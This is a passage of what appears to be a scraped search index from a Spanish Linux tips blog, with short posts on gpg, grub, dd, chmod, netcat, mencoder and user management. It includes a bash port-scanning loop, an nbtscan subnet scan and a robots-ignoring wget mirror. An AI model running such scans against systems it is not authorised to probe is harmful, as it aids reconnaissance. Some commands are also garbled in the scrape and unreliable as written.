-r \u0026#34;Tags:\u0026#34; -g \u0026#34;*.md\u0026#34;\u0026#39; parser = argparse.ArgumentParser( description=\u0026#39;DESCRIPCION:\\n Buscar y reemplazar recursivamente desde la carpeta dada usando expresiones regulares\u0026#39;, formatter_class=argparse.RawDescriptionHelpFormatter, epilog=\u0026#39;\u0026#39;\u0026#39;USO:\\n {0} -d \u0026#34;directorio/\u0026#34; -s \u0026#34;busca\u0026#34; -r \u0026#34;remplaza\u0026#34; -g \u0026#34;*.md\u0026#34;\u0026#39;\u0026#39;\u0026#39;.format( os.path.basename(sys.argv[0]))) parser.add_argument(\u0026#39;--dir\u0026#39;, \u0026#39;-d\u0026#39;, help=\u0026#39;Carpeta a buscar, por defecto la carpeta actual\u0026#39;, default=\u0026#39;.\u0026#39;) parser.add_argument(\u0026#39;--search-regex\u0026#39;, \u0026#39;-s\u0026#39;, help=\u0026#39;busca regex\u0026#39;, required=True) parser.add_argument(\u0026#39;--replace-regex\u0026#39;, \u0026#39;-r\u0026#39;, help=\u0026#39;remplaza regex\u0026#39;, required=True) parser.add_argument(\u0026#39;--glob\u0026#39;, \u0026#39;-g\u0026#39;, help=\u0026#39;patron de filtro para expecificar ficheros a remplazar, ej: *.md\u0026#39;, default=\u0026#34;*.*\u0026#34;) parser.add_argument(\u0026#39;--dryrun\u0026#39;, \u0026#39;-dr\u0026#39;, action=\u0026#39;store_true\u0026#39;, help=\u0026#34;No modificar nada, solo mostrar por pantalla\u0026#34;, default=False) parser.add_argument(\u0026#39;--create-backup\u0026#39;, \u0026#39;-b\u0026#39;, action=\u0026#39;store_true\u0026#39;, help=\u0026#39;Create backup files\u0026#39;, default=False) config = parser.parse_args(sys.argv[1:]) find_replace(config) Search and replace con Perl Parámetros de perl:\n-e significa ejecutar la siguiente línea de código. -i significa editar en el lugar -w escribe advertencias -p en el archivo de entrada, imprimiendo cada línea después de que se le aplique el script. Funcionalidad:\nRecursivo: ❌ Regex: ✔ En Fedora no me funciona\n1 2 3 4 5 #!/bin/bash buscar=\u0026#34;v\u0026#34; remplazar=\u0026#34;12_\u0026#34; ruta=\u0026#34;/tmp/kk\u0026#34; perl -pi -we \u0026#34;s/$buscar/$remplazar/g;\u0026#34; $(grep -rl \u0026#34;$ruta\u0026#34;) Tabla resumen Metodo Recursivo Regex egrep ✔ ✔* find ✔ ✔* python ✔ ✔ perl ✔ ❌ * sed no acepta caracteres de búsqueda literal como \\d, pero si [0-9]+)\n","date":"2015-12-01T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/buscar-y-remplazar/","title":"Buscar y remplazar"},{"content":"http://docs.getpelican.com/en/stable/content.html\nhttp://docs.getpelican.com/en/stable/publish.html\nhttp://docs.getpelican.com/en/stable/tips.html\nhttp://spapas.github.io/2013/10/07/pelican-static-windows/\nPara ver las opciones hacer un:\nmake\n$ ~/projects/pagina $ make devserver\n$ ~/projects/pagina $ make stopserver\n~/projects/pagina $ pelican -s pelicanconf.py python -m pelican.server\nhttp://www.pelicanthemes.com/\nModifying pelican tools for windows Pelican uses a Makefile and a unix shell script to generate the static html files and start an http server for development. Because I prefer to use windows, I answered no to the questions of generating these when pelican-quickstarte asked me. Instead I have included the following files inside the spapas.github.io directory:\npelrun.bat, to generate the content for your debug site in the output directory:\npelican content --debug --autoreload --output output --settings pelicanconf.py\npelserve.bat, to localy serve the generated debug site:\n1 2 3 pushd output python -m pelican.server popd pelpub.bat, to generate the production site in the output directory:\npelican content --output output --settings publishconf.py\nNow, when you want to develop your site locally, enter:\nspapas.github.io\u0026gt;start pelrun.bat spapas.github.io\u0026gt;start pelserv.bat\nIf everything was ok until now, you can visit http://127.0.0.1:8000 and will get the following output:\nFuentes: 1\n","date":"2015-11-30T00:00:00Z","image":"https://www.procamora.com/covers/draft.png","permalink":"https://www.procamora.com/p/guiabasicapelican/","title":"Guia Básica Pelican"},{"content":"En proceso\n###Paso 2\nhttp://www.eclipseonetips.com/2009/11/30/move-copy-delete-lines-with-a-single-keystroke/\nFuentes: tutorialspoint, opcoach, eclipseonetips\n","date":"2015-11-30T00:00:00Z","image":"https://www.procamora.com/covers/draft.png","permalink":"https://www.procamora.com/p/tipseclipse/","title":"Tips de Eclipse"},{"content":"Creación de un nuevo key-pair Generaremos nuestra pareja de llaves (pública y privada), que posteriormente utilizaremos para la encriptación de ficheros, utilizaremos el siguiente comando: sudo gpg --gen-key\nImportar y exportar keys Tras crear nuestra llave, podemos importarla o exportarla en distintos equipos, desde los que tenemos intención de compartir ficheros encriptados, para importar una llave ejecutamos: sudo gpg --import Public-key.asc\nPodemos exportar nuestra key del siguiente modo (ascii), luego podríamos utilizar el comando anterior para importarla en otro equipo. –ascii crea una salida ascii con armadura.: sudo gpg --armor --export UID \u0026gt; Public-key.asc\nUna vez importada la key en nuestro sistema, conviene firmarla para verificar la veracidad de la llave, utilizaremos el siguiente comando, donde UID es el ID/nombre de la llave.: sudo gpg --sign-key 'UID'\npara exportar clave privada: sudo gpg --armor --export-secret-key UID \u0026gt; Private-key.asc\n##Encriptar y desencriptar ######Una vez que tenemos la llave creada, instalada y firmada en el sistema, ya podemos empezar a encriptar y desencriptar ficheros. En el siguiente ejemplo vamos a encriptar un fichero de texto, los parámetros indican que se firma y cifra (-ser) para el usuario con su determinado UID/nombre creando una salida ascii con armadura (-a). tendremos que escribir la frase contraseña de la llave para hacer efectivo el cifrado: sudo gpg -sear 'UID' test2.txt\nNecesita una frase contraseña para desbloquear la clave secreta del usuario. \u0026ldquo;xxxx xxxx (xxx xxx) \u0026quot; clave DSA de 2048 bits, ID 7EEECF36, creada el 2010-11-08:\ngpg el agente gpg no esta disponible en esta sesión Introduzca frase contraseña:\n######Para hacer el proceso inverso de descifrado, utilizaríamos el siguiente comando, donde -d indica desencriptar y mensaje-cifrado.asc es el fichero generado en el anterior comando, que guardaremos en salida.txt: sudo gpg --output salida.txt -d mensaje-cifrado.asc\nEl proceso de desencriptar ficheros de equipos remotos es el mismo siempre que haya sido encriptado utilizando tu misma llave pública.:\nLa gestión básica de llaves resumiría los siguientes comandos:\n######Listar las llaves instaladas en el sistema: sudo gpg --list-keys\n######Borrar llave \u0026ldquo;test@test.com\u0026rdquo; instalada en nuestro sistema: sudo gpg --delete-key 'test@test.com'\n","date":"2015-11-28T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/usos_gpg/","title":"Uso de gpg"},{"content":"Bajar volumen en 10% amixer sset Master 10%-\nSubir volumen en 10% amixer sset Master 10%+\nActivar/desactivar silencio amixer sset Master toggle\nModo gráfico consola alsamixer\n","date":"2015-11-27T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/volumen/","title":"Cambiar volumen por consola"},{"content":"Conexión Puerto Serie Para la conexión por el puerto serie hace falta el programa ?????????? y estas con las características que hay que configurar 1 2 3 4 5 9600 bits por segundo, 8 bits de datos, sin paridad, 1 bit de parada sin control de flujo. ","date":"2015-11-25T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/puertoserie/","title":"Configuración de puerto serie"},{"content":"sudo apt-get install manpages-es manpages-es-extra\n","date":"2015-11-20T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/man_espa%C3%B1ol/","title":"Instalar man en español"},{"content":"sudo lshw -C cpu\n","date":"2015-11-18T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/datos_pc/","title":"Ver características del pc"},{"content":"cd /home/nombre-de-usuario/Documentos\npython -m SimpleHTTPServer\nY abras creado un servidor web, que permite a otros usuarios acceder al contenido de tu carpeta desde un navegador si utilizan la siguiente URL:\nhttp://IP_de_tu_equipo:8000\n","date":"2015-11-17T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/compartir_archivos_localmente/","title":"Compartir archivos localmente"},{"content":"######1. Controla la cantidad de RAM que tiene libre: free\n######2. Donde esta la aplicación que acabo de instalar (todos los directorios) whereis [app]\n######3. Uso del espacio de su disco df -h\n######4. Crear una lista de reproducción de los archivos de audio en una carpeta. ls -R \u0026gt; playlist.m3u\n######5. Matar un proceso por su nombre sudo killall por ejemplo: sudo killall firefox. O via pid (program id): sudo kill\npara ver el pid: pidof por ejemplo: pidof firefox\no puedes probar ver la lista de procesos que se están ejecutando actualmente con: ps -e\n######6. Encontrar la versión del software instalado: sudo apt-cache policy\n######7. Encontrar el UUID de tus particiones: ls /dev/disk/by-uuid/ -alh\n######8. Mostrar los diez procesos principales que se están ejecutando – ordenados por el uso de la memoria: ps aux | sort -nrk 4 | head\n######9. Establecer una alarma sonora cuando una dirección IP salga online ping -i 60 -a IP_address\n######10. Montar un archivo .iso en UNIX/Linux: mount /path/to/file.iso /mnt/cdrom -oloop\n######11. Compartir un archivo a través del puerto 80 http: nc -w 5 -v -l -p 8081 \u0026lt; file.ext\nDesde la otra máquina abrir un navegador web y vaya a la ip de la máquina desde la que quiere lanzar netcat, http://ip-address:8081 Si usted tiene alguno servidor web escuchando en el puerto 80, entonces sería necesario detenerlos o seleccionar otro puerto antes de lanzar: net cat ;-)\nP.d.:es necesario instalar netcat tool\n######12. Extracto de audio stream de un archivo AVI usando mencoder: mencoder \u0026quot;${file}\u0026quot; -of rawaudio -oac mp3lame -ovc copy -o audio/\u0026quot;${file/%avi/mp3}\n######13. Captura de video desde linux desktop: ffmpeg -f x11grab -s wxga -r 25 -i :0.0 -sameq /tmp/out.mpg\n######14. Descarga una website completa: wget --random-wait -r -p -e robots=off -U mozilla http://www.example.com\n######15. Matar: un proceso que esta bloqueando un archivo: fuser -k filename\n######16. Escaneo de puertos usando telnet: HOST=127.0.0.1;for((port=1;port/dev/null | grep 'Connected to' \u0026gt; /dev/null; then echo -en \u0026quot;nnport $port/tcp is opennn\u0026quot;;fi;done | grep open\n","date":"2015-11-16T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/16_magnificos_comandos/","title":"16 comandos útiles"},{"content":"adduser: Se utiliza para añadir un usuario.\n*Uso: adduser Alias (este esta bien explicado en un post anterior)\nUso: alias nombrequeledamos=’comando’\napt-get install nombredelprograma = instala el paquete.\napt-get remove nombredelprograma = Borra el paquete. Con la opción –purge borra también la configuración del paquete instalado.\napt-get update = Actualiza la lista de paquetes disponibles para instalar.\napt-get upgrade = Instala las nuevas versiones de los diferentes paquetes disponibles.\ncd = Cambia el directorio.\nUso: cd nombredirectorio\nContinuar leyendo el resto de comandos:\nchmod: Cambia los permisos de los archivos.\nr:lectura w:escritura x:ejecución +: añade permisos -:quita permisos u:usuario g:grupo del usuario o:otros Uso: chmod permisos nombrearchivo\nchown: Cambia el propietario de un archivo.\nUso: chown cp:Copia archivos en el directorio indicado.\nUso: cp archivoorigen archivodestino\ndeluser: Elimina una cuenta de usuario\nUso: deluser exit: Cierra las ventanas o las conexiones remotas establecidas\nfsck: Sirve para chequear si hay errores en nuestro disco duro.\nUso: fsck -t \u0026lt;fs_typo\u0026gt; ftp: Protocolo de Transferencia de Archivos, permite transferir archivos de y para computadores remotos.\nUso: ftp \u0026lt;maquina_remota\u0026gt;\ngrep: Su funcionalidad es la de escribir en salida estándar aquellas líneas que concuerden con un patrón. Busca patrones en archivos.\ngrep: grep ifconfig: Obtener información de la configuración de red\nkill: Termina un proceso\nUso: kill numeroPID\nls:Lista los archivos y directorios dentro del directorio de trabajo.\nmake: Crea ejecutables a partir de los archivos fuente.\nman: muestra el manual de un programa o comando si este esta disponible\nUso: man mkdir: Crea un nuevo directorio.\nUso: mkdir nombredirectorio\nmount: Monta una unidad.\nUso: mount -t\u0026lt; sistema_de_archivo\u0026gt; mv: Este comando sirve para renombrar un archivo.\nUso: mv netstat:Muestra las conexiones y puertos abiertos por los que se establecen las comunicaciones.\npoweroff: Apaga el ordenador.\nps: Muestra información acerca de los procesos activos.\nrlogin: Conecta un host local con un host remoto.\nUso: rlogin \u0026lt;maquina_remota\u0026gt;\nrm: Remueve o elimina un archivo.\nUso: rm rmdir: Elimina el directorio indicado, el cual debe estar vacío.\nUso: rmdir nombredirectorio\nsudo o su: Con este comando accedemos al sistema como root.\numount: Desmontar unidades montadas anteriormente\nUso: umount wc:Cuenta los caráteres, palabras y líneas del archivo de texto.\nUso: wc nom_archivo\nwhereis: Devuelve la ubicación del archivo especificado, si existe.\nUso: whereis nomb_archivo\n","date":"2015-11-15T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/comandos_basicos/","title":"Comandos básicos"},{"content":"sudo apt-get install nbtscan\nsudo nbtscan -v -s : 192.168.1.0/24\n","date":"2015-11-14T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/nbtscan/","title":"Escáner puertos con nbtscan"},{"content":"instalar paquete de imágenes sudo aptitude install grub2-splashimages\ncarpeta de imágenes del grub /usr/share/images/grub/\narchivo configuración grub sudo gedit /etc/grub.d/05_debian_theme\nactualizar grub update-grub2\nen caso de no ser suficiente sudo grub-mkconfig -o /boot/grub/grub.cfg\nlas imágenes del grub deben estar a 640x480\nRECUPERAR EL ARRANQUE GRUB Método 1 Consiste en usar una distribución en modo LiveCD para instalar nuevamente el GRUB. Usaremos el LiveCD de Ubuntu 9.10 o superior (debe ser la versión Live o Desktop), aunque puede ser cualquier otra distribución que use GRUB2 como gestor de arranque y no LILO ni Grub 1.\nLo primero que debemos hacer es arrancar el live-cd y abrir una terminal. Después escribimos los siguiente para ver las particiones de los distintos discos duros: sudo fdisk -l\nDespués vemos cual es la partición donde tenemos Ubuntu y la montamos en /mnt (en la mayoría de los casos esta partición será sda1, el ejemplo lo haré con esa partición pero mira cual es tu partición con el comando fdisk): sudo mount /dev/sda8 /mnt\nAhora, monta el resto de los dispositivos: sudo mount --bind /dev /mnt/dev\nsudo mount --bind /dev/pts /mnt/dev/pts\nsudo mount --bind /proc /mnt/proc\nsudo mount --bind /sys /mnt/sys\nY ejecuta el comando chroot de forma que accedemos como root al sistema de archivos de nuestro antiguo Ubuntu: sudo chroot /mnt\nPor último cargamos el Grub en el MBR ejecutando el siguiente comando: # grub-install --recheck /dev/sda\n(sda lo debemos substituir por el disco duro que utilizamos para arrancar los sistemas operativos, casi siempre es sda. Ojo!! no poner el número de partición, solo sda).\nReiniciamos y cuando vuelva a arrancar Ubuntu (no el del LiveCD), podemos ajustar en el menú del GRUB manualmente para que aparezca en el menú de arranque el nuevo sistema operativo que nos borró el MBR, o dejar que lo haga el automáticamente con el siguiente comando: sudo update-grub2\nSi el comando no te funciona, quizás necesites instalar el paquete grub2: sudo apt-get install grub2\n`\n","date":"2015-11-13T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/grub/","title":"Modificar el grub"},{"content":"El comando convert nos permite realizar distintos tipos de conversiones en una imagen. La opción -resize sirve cambiar el tamaño. Veamos unos ejemplo sencillos:\nsudo convert elefante.jpg elefante.png sudo convert elefante.jpg -resize 640×480 elefantemini.jpg sudo convert elefante.jpg -resize 640×480 elefante.png\nEn el primer ejemplo hemos cambiado de formato, en el segundo de tamaño y en el tercero de formato y tamaño a la vez.\n##Reducir imágenes\n######Tenemos varias imágenes. Podemos escribir uno a uno los nombres de cada imagen, pero si son muchas resultaría demasiado lento. Lo mejor es meterlas todas en una misma carpeta. Luego abrimos una terminal, dentro de la carpeta, y escribimos:\nsudo convert \u0026quot;*.jpg\u0026quot; -resize 150×150 imagen%02d.png\nCon \u0026ldquo;*.jpg\u0026rdquo; le estamos diciendo al programa que tome como entrada a todos los archivos que terminen en .jpg que hay en ese directorio; con imagen%02d.png estamos diciendo que los archivos de salida serán en formato png y su nombre estará formado por la palabra imagen seguida de un número formado por dos dígitos (imagen00, imagen01, imagen02, imagen03,…); si tenemos más de 100 y necesitamos usar 3 dígitos escribiremos %03d, en lugar de %02d.\nAunque le hayamos dicho que las reduzca todas a una tamaño de 150×150 pixeles, convert respetara siempre las proporciones de la imagen original (asignando los 150 pixeles a uno solo de los lados). Si queremos que la anchura sea siempre la misma, y sea la altura lo que varíe, escribiremos solo el primero de los valores (-resize 150). Si, por el contrario, queremos que sea la altura lo que permanezca constante, escribiremos el segundo valor precedido del signo x (-resize x150). Y si lo que queremos es que se ajuste al ancho y alto que hemos determinado, ignorando las proporciones de la imagen original, añadiremos ! (barra invertida exclamación); ejemplo: -resize 150×150!, cuando las proporciones no coincidan la imagen se deformará para ajustarse al tamaño asignado.\n######Si tenemos muchas imágenes puede ser más rápido si escribimos:\nsudo convert \u0026quot;*.jpg\u0026quot;[150x150] imagen%02d.png\nEsto hará que, en lugar de leer primero todas las imágenes y luego reducirlas, las vaya reduciendo según las va leyendo; con esto el ordenador irá más rápido y consumirá menos recursos.\nPodemos, también, reducir las imágenes en un tanto por ciento, por ejemplo escribiendo -resize 50% las reduciremos a la mitad.\nAhora vamos a ver otras opciones para reducir imágenes:\nthumbnail\n######Esta opción esta pensada para reducir el tamaño de imágenes muy muy grandes. Combina tres opciones: -strip elimina la información adicional que suele acompañar a las fotos de las cámaras digitales y a las imágenes tratadas con algunos programas de retoque fotográfico; -sample reduce varias veces la imagen; y -resize da el tamaño final. Por ejemplo:\n`sudo convert \u0026ldquo;*.jpg\u0026rdquo; -thumbnail 150×150 imagen%02d.png\nscale\n######Es una versión simplificada de resize. Es más rápido y ligero, pero la imagen resultante puede perder algo de calidad.\nconvert \u0026quot;*.jpg\u0026quot; -scale 150×150 imagen%02d.png\n","date":"2015-11-11T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/imagemagik/","title":"Modificar imágenes con ImageMagik"},{"content":"vim /etc/network/interfaces\n1 2 3 4 5 auto eth0 inface eth0 inet static address 192.168.1.3 netmask 255.255.255.0 gateway 192.168.1.1 /etc/init.d/networking stop \u0026amp;\u0026amp; /etc/init.d/networking start\no\n/etc/init.d/networking restart\n","date":"2015-11-10T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/ip_statica/","title":"Poner ip statica"},{"content":"sudo apt-get install gnome-shell\n","date":"2015-11-09T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/gnome-shell/","title":"Instalar gnome shell"},{"content":"La orden dd hace una copia exacta byte a byte.\nEjemplos:\nClonar un disco duro: dd if=/dev/sda |pv|dd of=/dev/sdb\n######Clonar una partición: dd if=/dev/sdc2 |pv|dd of=/dev/sda1\n######Crear una imagen iso de una partición o disco duro (excelente opción para backups): dd if=/dev/sda1 |pv|dd of=/home/usuario/backup.iso\nEn algunas distros puede que pv no venga instalado, así que bastará con instalarlo para poder usar este tip.\n","date":"2015-11-08T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/dd/","title":"Uso de dd"},{"content":"Se usaba para reparar una unidad con archivos corruptos que no se pueden eliminar, tengo que repasar su funcionamiento\nfsck /dev/sdaX\n","date":"2015-11-07T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/eliminar_archivo_corrupto/","title":"Eliminar un archivo corrupto"},{"content":"Para crear lanzadores en gnome 2:\ngnome-desktop-item-edit --create-new ~/Escritorio\n","date":"2015-11-06T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/crear_lanzadores/","title":"Crear un acceso directo por consola"},{"content":"Para instalar los guest adition en una maquina instalada en virtualbox ejecutar\nsudo apt-get install virtualbox-ose-guest-x11\nEn las ultimas versiones de debian (jessie y sid) no estaban en los repositorios, supongo que seria porque en este momento son ramas en desarrollo\njessie -\u0026gt; testing\nsid -\u0026gt; unestable\n","date":"2015-11-05T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/ajustar_pantalla/","title":"Ajustar pantalla virtualbox"},{"content":"chmod sirve para modificar los permisos de ficheros y directorios chmod [opciones] modo[,modo] fichero\nPara ello tenemos que tener claros los distintos grupos de usuarios:\n1 2 3 4 u: usuario dueño del fichero g: grupo de usuarios del dueño del fichero o: todos los otros usuarios a: todos los tipos de usuario (dueño, grupo y otros) También hay que saber la letra que abrevia cada tipo de permiso:\n1 2 3 r: se refiere a los permisos de lectura w: se refiere a los permisos de escritura x: se refiere a los permisos de ejecución 1 2 3 4 5 6 7 8 - - - = 0 no se tiene ningún permiso - - x = 1 solo permiso de ejecución - w - = 2 solo permiso de escritura - w x = 3 permisos de escritura y ejecución r - - = 4 solo permiso de lectura r - x = 5 permisos de lectura y ejecución r w - = 6 permisos de lectura y escritura r w x = 7 todos los permisos establecidos, lectura, escritura y ejecución ","date":"2015-11-04T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/comando_chmod/","title":"Uso de chmod"},{"content":"Los directorios rc Debajo de /etc se encuentra el directorio rc.d que a la vez contiene un directorio para cada nivel de ejecución, así tenemos rc0.d, rc1.d, rc2.d, rc3.d, etc. Hay algunas distros que estos directorios están ubicados directamente en /etc. Como ya te imaginaras, cada uno de estos directorios contiene scripts (o mas bien enlaces a scripts) que apuntan al directorio init.d, entonces el comando init (ya sea ejecutado manualmente o cuando se inicia el sistema), dependiendo del nivel indicado leerá cada uno de los enlaces o accesos directos del directorio respectivo.\nAhora bien, un ejemplo (parcial) típico de estos directorios puede ser el siguiente, tomado de rc3.d\n1 2 3 4 5 6 7 8 9 10 11 lrwxrwxrwx 1 root root 7 Oct 20 20:05 K22dbus -\u0026gt; ../init.d/dbus lrwxrwxrwx 1 root root 9 Oct 20 20:05 K22resmgr -\u0026gt; ../init.d/resmgr lrwxrwxrwx 1 root root 8 Oct 20 20:05 K24fbset -\u0026gt; ../init.d/fbset lrwxrwxrwx 1 root root 9 Oct 20 20:05 K24random -\u0026gt; ../init.d/random lrwxrwxrwx 1 root root 8 Oct 20 18:23 S01fbset -\u0026gt; ../init.d/fbset lrwxrwxrwx 1 root root 9 Oct 20 18:22 S01random -\u0026gt; ../init.d/random lrwxrwxrwx 1 root root 7 Oct 20 18:29 S03dbus -\u0026gt; ../init.d/dbus lrwxrwxrwx 1 root root 9 Oct 20 18:23 S03resmgr -\u0026gt; ../init.d/resmgr lrwxrwxrwx 1 root root 12 Oct 20 18:24 S04boot.udev -\u0026gt; ../init.d/boot.udev lrwxrwxrwx 1 root root 10 Oct 20 21:16 S05network -\u0026gt; ../init.d/network lrwxrwxrwx 1 root root 9 Oct 20 18:23 S06syslog -\u0026gt; ../init.d/syslog Nótese que todos son enlaces al directorio init.d que como ya se vio previamente es donde realmente están ubicados los scripts de arranque de los servicios o servidores. También, todos los enlaces comienzan con K (kill) o con S (start), es pues fácil deducir que los que comienzan con K son scripts que recibirán el argumento stop y los que comienzan con S el de start, es decir, se inician. Esta gran simplicidad ofrece una enorme potencia al momento de configurar servicios ya que basta con agregar o quitar enlaces con el formato indicado para personalizar los niveles de ejecución a nuestro gusto.\nDespués de la K o S sigue un número consecutivo, seguido generalmente del nombre del servicio que afectan, el número secuencial es simplemente el orden en que se leerán los scripts, primero los K comenzando con el 01 y hacía adelante y después los S. Entonces si por ejemplo no queremos que se inicie el samba en el nivel 3 bastaría con borrar su enlace en este directorio:\npwd\n1 /etc/rc.d/rc3.d rm S54smb\nY listo, el servidor samba ya no arrancaría cuando entremos en este nivel de ejecución. Si por lo contrario lo que deseamos es iniciar (o apagar) un servicio, basta con crear su enlace en el directorio respectivo:\npwd\n1 /etc/rc.d/rc5.d `ln -s /etc/rc.d/init.d/mysql S90mysql\n`ls -l S90mysql\n1 lrwxrwxrwx 1 root root 9 Oct 20 18:23 S90mysql -\u0026gt; ../init.d/mysql Con esto la siguiente vez que iniciemos el equipo o cambiemos a nivel 5 con init, también se iniciará el servidor de la base de datos MySQL. El número 90 es escogido al azar entre 01 y 99 es simplemente el orden en que serán iniciados o detenidos los servicios.\n","date":"2015-11-02T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/rc_local/","title":"Uso de rc.local"},{"content":"Creamos el usuario: sudo useradd -G ftp -d /home/ftp/rocky -c \u0026quot;Nombre y Apellidos\u0026quot; rocky\n1 2 3 4 -G ftp El usuario pertenece al grupo FTP -d /home/ftp/pedro Es el directorio de trabajo del usuario -c \u0026#34;Nombre y Apellidos\u0026#34; Es un comentario del usuario -s /bin/bash Es el shell que usara el usuario Asignamos una contraseña para el usuario sudo passwd rocky\nModificar un usuario sudo usermod -s /bin/ftp rocky\n1 2 3 4 5 6 7 8 9 -c añade o modifica el comentario /etc/passwd -d modifica el directorio de trabajo del usuario -g cambia el número de grupo principal del usuario (GID) -G establece otros grupos a los que puede pertenecer el usuario, separados por comas. -l cambia el login o nombre del usuario -L bloque la cuenta del usuario, no permitiéndole que ingrese al sistema. -s cambia el shell por defecto del usuario cuando ingrese al sistema. -u cambia el UID del usuario. -U desbloquea una cuenta previamente bloqueada con la opción -L. Borrar un usuario de etc/passwd y /etc/shadow sudo userdel nombre_usuario\nBorrar un usuario de etc/passwd /etc/shadow y su carpeta personal sudo userdel -r nombre_usuario\nUn usuario de etc/passwd /etc/shadow su carpeta personal aunque el usuario este logueado en el sistema sudo userdel -f nombre_usuario\nCrear un grupo de usuarios sudo groupadd nombre_grupo\n","date":"2015-11-01T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/usuarios_grupos/","title":"Gestión de usuarios y grupos ftp"},{"content":"Para poner en el menú contextual de gnome descomprimir rar hace falta instalar file-roller sudo apt-get install file-roller\n","date":"2015-10-24T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/menu_contextual_rar/","title":"Añadir al menú contextual extraer en"},{"content":"mount /ruta/fichero.iso /mnt/cdrom -oloop\numount /mnt/cdrom\n","date":"2015-10-23T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/montar_fichero_iso_como_cd-rom/","title":"Montar iso en cdrom"},{"content":"Cambiar formato de los vídeos mencoder -idx 'videooriginal.ogv' -ovc lavc -oac mp3lame -o 'videofinal.flv'\nIncluir subtítulos en un vídeo mencoder 'VideoOriginal.avi' -sub 'ArchivoDeSubtitulos.srt' -subcp utf-8 -oac copy -ovc xvid -xvidencopts pass=1 -o 'VideoDeSalida.avi'\nUnir 2 vídeos mencoder -oac copy -ovc copy -o 'video_completo.avi' 'parte1.avi' 'parte2.avi'\n","date":"2015-10-22T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/mencoder/","title":"Cambiar formato videos"},{"content":"En linux los programas se instalan en su sitio:\nLos binarios en /usr/bin/ Las librerías en /usr/lib/ Los archivos de configuración en /etc/ Los archivos de configuración personal en $HOME o ~/ whereis \u0026lt;programa\u0026gt;\n","date":"2015-10-10T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/localizacion_programas/","title":"Ruta de los binarios en linux"},{"content":"ifconfig eth0 | awk '/inet addr/ {split ($2,A,\u0026quot;:\u0026quot;); print A[2]}'\n","date":"2015-10-09T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/ip/","title":"Script sacar ip linux"},{"content":"Para hacer un chat entre ordenadores en una red local Servidor nc -l -p 6698\nCliente nc ip-server 6698\nImportante: La conversación se manda por paquetes tcp sin cifrar, por lo que con un sniffer(wireshark) en la red local se pueden leer los paquetes\n","date":"2015-10-08T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/netcat/","title":"Crear chat con netcat"},{"content":"Para ver solo los puertos que hay a escuchando\nnetstat -lnpt\n","date":"2015-10-07T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/netstat/","title":"Revisar puertos netstat"},{"content":" 1 2 3 4 significa permiso de lectura 2 significa permiso de escritura 1 significa permiso de ejecución Estos números se pueden sumar para asignar una configuración de permisos mas adecuada, Ejemplos: 4+1=5, entonces el 5 significa lectura+ ejecución, otra configuración es 4+2+1=7, entonces el 7 significa que el archivo tiene permisos de lectura+escritura+ ejecución (todos los permisos), una ultima configuración; 4+2=6, entonces el 6 significa permisos de lectura+escritura.\nlectura(r), escritura(w) y ejecución(x) al usuario(u) y al grupo(g)\n","date":"2015-10-06T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/permisos/","title":"Permisos linux"},{"content":"A veces sucede que, cuando tienes que instalar o configurar un ordenador nuevo, simplemente esperas que todo funcione como debiera tras instalar los tantos megas correspondientes. Pero no siempre es así y, como la memoria de uno ya no es lo que era, la búsqueda de soluciones se vuelve un laberinto del que no resulta fácil salir.\nEn esta ocasión (habrá otras, no lo dudo), el culpable ha sido Caja, al tratar de acceder vía SAMBA a mi raspberry para recuperar el último episodio de una serie. Con toda su desfachatez, me mostraba el mensaje:\nCould not display \u0026ldquo;network:///\u0026rdquo;\nCaja cannot handle \u0026ldquo;network\u0026rdquo; locations.\nNOTA: el error, lo he constatado, aparece tanto para nautilus como para caja.\nFue echarle un ojo y saber que estaba relacionado con GVFS porque todo lo que huela a red en GNOME y alrededores tiene que ver con ese paquete, pero me tuve que pasar mis buenos quince minutos buscando, cribando la red en dos idiomas distintos para dar con la solución. Son dos míseros paquetes:\nsudo apt-get install gvfs-backends libsmbclient\nY listo, caja (o nautilus) volverá a funcionar como siempre, accediendo vía samba y ssh al resto de la red.\nFuente: 0\n","date":"2015-10-05T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/problemasredgnome/","title":"Arreglar 